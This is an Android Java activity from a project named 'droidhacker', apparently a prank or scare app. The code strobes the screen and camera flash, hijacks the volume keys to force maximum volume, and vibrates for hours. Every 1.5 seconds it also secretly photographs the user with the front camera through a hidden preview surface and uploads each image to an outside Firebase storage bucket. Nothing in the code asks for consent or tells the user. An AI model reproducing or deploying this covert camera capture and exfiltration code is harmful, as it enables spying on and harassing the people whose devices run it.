package com.example.erickwendel.droidhacker;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Handler;
import android.os.Vibrator;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.Calendar;
import java.util.Date;


public class Main2Activity extends AppCompatActivity {

    private WindowManager.LayoutParams layout;
    private int value = 0;
    private int value2 = 0;
    private int value3 = 0;
    private int value4 = 0;
    private Camera camera;
    private boolean isFlashOn;
    private boolean hasFlash;
    Camera.Parameters params;

    private ImageView img_warn1;
    private ImageView img_warn2;

    private AudioManager audio;
    private MediaPlayer mp;
    private Handler handler;

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if ((keyCode == KeyEvent.KEYCODE_VOLUME_DOWN)) {
            audio = (AudioManager) this.getSystemService(Context.AUDIO_SERVICE);
            audio.setStreamVolume(AudioManager.STREAM_MUSIC, audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

            return true;
        } else if ((keyCode == KeyEvent.KEYCODE_VOLUME_UP)) {
            audio = (AudioManager) this.getSystemService(Context.AUDIO_SERVICE);
            audio.setStreamVolume(AudioManager.STREAM_MUSIC, audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

            return true;
        } else
            return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        final Handler hxzy1 = new Handler();
        hxzy1.postDelayed(new Runnable() {

            @Override
            public void run() {
                takePhoto();

                getWindow().setAttributes(layout);

                hxzy1.postDelayed(this, 1500);
            }
        }, 1500);


        layout = getWindow().getAttributes();
        final Handler h = new Handler();
        h.postDelayed(new Runnable() {

            @Override
            public void run() {
                if (value == 1) {
                    layout.screenBrightness = 0F;
                    value = 0;
                } else {
                    layout.screenBrightness = 1F;
                    value = 1;
                }

                getWindow().setAttributes(layout);

                h.postDelayed(this, 1000);
            }
        }, 1000);

        final Handler hx = new Handler();
        hx.postDelayed(new Runnable() {

            @Override
            public void run() {
                if (value2 == 1) {
                    value2 = 0;
                    turnOnFlash();
                } else {
                    value2 = 1;
                    turnOffFlash();
                }

                getWindow().setAttributes(layout);

                hx.postDelayed(this, 100);
            }
        }, 100);

        hasFlash = getApplicationContext().getPackageManager()
                .hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);

        if (!hasFlash) {
            // device doesn't support flash
            // Show alert message and close the application
            AlertDialog alert = new AlertDialog.Builder(Main2Activity.this)
                    .create();
            alert.setTitle("Error");
            alert.setMessage("Sorry, your device doesn't support flash light!");
            alert.setButton("OK", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    // closing the application
                    finish();
                }
            });
            alert.show();
            return;
        }

        // get the camera
        getCamera();

        img_warn1 = (ImageView) findViewById(R.id.img_warn1);
        img_warn2 = (ImageView) findViewById(R.id.img_warn2);

        final Handler hxz = new Handler();
        hxz.postDelayed(new Runnable() {

            @Override
            public void run() {
                if (value3 == 1) {
                    value3 = 0;
                    img_warn1.setVisibility(View.INVISIBLE);
                } else {
                    value3 = 1;
                    img_warn1.setVisibility(View.VISIBLE);
                }

                getWindow().setAttributes(layout);

                hxz.postDelayed(this, 100);
            }
        }, 100);

        final Handler hxzy = new Handler();
        hxzy.postDelayed(new Runnable() {

            @Override
            public void run() {
                if (value4 == 1) {
                    value4 = 0;
                    img_warn2.setVisibility(View.INVISIBLE);
                } else {
                    value4 = 1;
                    img_warn2.setVisibility(View.VISIBLE);
                }

                getWindow().setAttributes(layout);

                hxzy.postDelayed(this, 100);
            }
        }, 100);

        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        Intent intent1 = new Intent("usb_detect");
        sendBroadcast(intent1);

        audio = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        audio.setStreamVolume(AudioManager.STREAM_MUSIC, audio.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);

        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(10550000);

//        Uri notification = Uri.parse("android.resource://com.example.erickwendel.droidhacker/" + R.raw.gemidao);
//        mp = MediaPlayer.create(this, notification);
//
//        mp.setLooping(true);
//        mp.start();
//
//        while (true) {
//
//            if (mp.isPlaying()) continue;
//            mp.setLooping(true);
//            mp.start();
//        }
    }

    // Get the camera
    private void getCamera() {
        if (camera == null) {
            try {
                camera = Camera.open();
                params = camera.getParameters();
            } catch (RuntimeException e) {
//                Log.e("Camera Error. Failed to Open. Error: ", e.getMessage());
            }
        }
    }


    // Turning On flash
    private void turnOnFlash() {
        if (!isFlashOn) {
            if (camera == null || params == null) {
                return;
            }

            params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
            camera.setParameters(params);
            camera.startPreview();
            isFlashOn = true;

        }

    }


    // Turning Off flash
    private void turnOffFlash() {
        if (isFlashOn) {
            if (camera == null || params == null) {
                return;
            }

            params = camera.getParameters();
            params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
            camera.setParameters(params);
            camera.stopPreview();
            isFlashOn = false;

        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected void onPause() {
        super.onPause();

        // on pause turn off the flash
        turnOffFlash();
    }

    @Override
    protected void onRestart() {
        super.onRestart();
    }

    @Override
    protected void onResume() {
        super.onResume();

        // on resume turn on the flash
        if (hasFlash)
            turnOnFlash();
    }

    @Override
    protected void onStart() {
        super.onStart();

        // on starting the app get the camera params
        getCamera();
    }

    @Override
    protected void onStop() {
        super.onStop();

        // on stop release the camera
        if (camera != null) {
            camera.release();
            camera = null;
        }
    }

    private void takePhoto() {

        System.out.println("Preparing to take photo");
        Camera camerax = null;

        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();


        final int camIdx = 1;
        Camera.getCameraInfo(camIdx, cameraInfo);

        try {
            camerax = Camera.open(camIdx);
        } catch (RuntimeException e) {
            System.out.println("Camera not available: " + camIdx);
            camerax = null;
            //e.printStackTrace();
        }
        try {
            if (null == camerax) {
                System.out.println("Could not get camera instance");
            } else {
                System.out.println("Got the camera, creating the dummy surface texture");
                try {

                    camerax.setPreviewTexture(new SurfaceTexture(0));
                    camerax.startPreview();
                } catch (Exception e) {
                    System.out.println("Could not set the surface preview texture");
                    e.printStackTrace();
                }
                camerax.takePicture(null, null, new Camera.PictureCallback() {

                    @Override
                    public void onPictureTaken(byte[] data, Camera camerax) {
                        File pictureFileDir = getFilesDir();
                        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
                            return;
                        }


                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, (int) (bitmap.getWidth() * 0.3), (int) (bitmap.getHeight() * 0.3), true);

                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//                        resized.compress(Bitmap.CompressFormat.PNG, 20, byteArrayOutputStream);

                        byte[] byteArray = byteArrayOutputStream.toByteArray();

                        String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);

//                        ImageView image = findViewById(R.id.image);
//                        image.setImageBitmap(bitmap);

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        resized.compress(Bitmap.CompressFormat.PNG, 20, baos);

                        camerax.release();

                        Date currentTime = Calendar.getInstance().getTime();

                        FirebaseStorage storage = FirebaseStorage.getInstance();
                        StorageReference storageRef = storage.getReferenceFromUrl("gs://saveimagetofirebase.appspot.com");
                        StorageReference mountainsRef = storageRef.child(currentTime + ".jpg");

                        UploadTask uploadTask = mountainsRef.putBytes(baos.toByteArray());
                        uploadTask.addOnFailureListener(new OnFailureListener() {
                            @Override
                            public void onFailure(@NonNull Exception exception) {
                                Log.e("DEU RUIM", exception.getMessage());
                            }
                        }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                            @Override
                            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                                // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                                Uri downloadUrl = taskSnapshot.getDownloadUrl();
                                Log.e("downloadUrl", downloadUrl.toString());

//                                FirebaseDatabase database = FirebaseDatabase.getInstance();
//                                DatabaseReference myRef = database.getReference("message");
//
//                                myRef.setValue(downloadUrl.toString());
                            }
                        });
//


                    }
                });
            }
        } catch (Exception e) {
            camerax.release();
        }
//        }

    }

}
